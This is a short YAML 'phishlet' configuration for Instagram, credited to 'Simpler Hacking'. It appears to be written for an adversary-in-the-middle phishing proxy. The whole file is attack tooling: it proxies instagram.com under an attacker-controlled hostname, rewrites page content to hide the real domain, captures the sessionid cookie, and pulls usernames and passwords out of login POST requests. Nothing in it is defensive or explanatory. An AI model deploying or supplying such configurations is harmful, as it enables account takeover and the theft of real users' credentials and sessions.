‘’’ yaml
name: 'Instagram Phishlet'
author: 'Simpler Hacking'
min_ver: '3.2.0'
proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true }
sub_filters:
  - { hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*'] }
  - { hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'instagram.com', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded'] }
auth_tokens:
  - domain: 'instagram.com'
    keys: ['sessionid']
creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'
auth_urls:
  - url_regex: 'https://{hostname}/accounts/login/'
    valid_statuses: [200]
    login:
      username: user
      password: pass
      url: https://www.instagram.com/accounts/login/

‘’’